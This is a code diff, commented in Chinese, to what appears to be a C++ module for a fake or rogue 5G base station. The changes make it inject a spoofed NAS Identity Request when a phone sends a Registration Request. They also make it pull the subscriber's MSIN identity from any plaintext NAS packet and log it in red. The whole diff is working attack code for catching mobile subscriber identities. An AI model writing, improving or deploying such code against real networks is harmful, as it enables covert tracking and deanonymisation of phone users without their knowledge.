@@ -55,9 +55,9 @@ public:
 
   void setup() override
   {
-    f_registration_request = wd_filter("nas_5gs.mm.message_type == 0x41"); // Registration Request
-    f_identity_response    = wd_filter("nas_5gs.mm.message_type == 0x5c"); // Identity Response
-    f_msin                 = wd_field("nas_5gs.mm.suci.msin");              // MSIN 字段
+    f_registration_request = wd_filter("nas-5gs.mm.message_type == 0x41"); // Registration Request
+    f_identity_response    = wd_filter("nas-5gs.mm.message_type == 0x5c"); // Identity Response
+    f_msin                 = wd_field("nas-5gs.mm.suci.msin");              // MSIN 字段
     f_rrc_setup_request    = wd_filter("nr-rrc.c1 == 0");                  // RRC Setup Request
     f_ack_sn               = wd_field("rlc-nr.am.ack-sn");
     f_sn                   = wd_field("rlc-nr.am.sn");
@@ -82,13 +82,15 @@ public:
                        uint32_t              slot_idx,
                        srslog::basic_logger& logger) override
   {
-    // 检查是否收到 Identity Response —— 提取其中的 MSIN (用户身份)
+    // 提取任何明文 NAS 包里的 SUCI MSIN；部分 UE 会在 Registration Request 中携带。
+    wd_field_info_t identity_info = wd_read_field(wd, f_msin);
+    if (identity_info) {
+      const char* identity = packet_read_field_string(identity_info);
+      logger.info(RED "MSIN extracted: %s" RESET, identity);
+    }
+
     if (wd_read_filter(wd, f_identity_response)) {
-      wd_field_info_t identity_info = wd_read_field(wd, f_msin);
-      if (identity_info) {
-        const char* identity = packet_read_field_string(identity_info);
-        logger.info(RED "Identity: %s" RESET, identity);
-      }
+      logger.info("Received Identity Response");
     }
 
     if (direction == UL) {
@@ -120,8 +122,9 @@ public:
     }
 
     // 检测到 Registration Request -> 注入 Identity Request
-    if (wd_read_filter(wd, f_registration_request)) {
+    if (!identity_request_sent && wd_read_filter(wd, f_registration_request)) {
       send_identity_request();
+      identity_request_sent = true;
       logger.info("Sent identity request");
     }
   }
@@ -145,6 +148,7 @@ private:
 
   uint32_t dl_sn     = 0;  ///< 当前下行发送 SN
   uint32_t dl_ack_sn = 1;  ///< 当前下行 ACK SN
+  bool     identity_request_sent = false;
 
   std::shared_ptr<std::vector<uint8_t> > identity_request; ///< 待注入的 Identity Request 载荷
 };
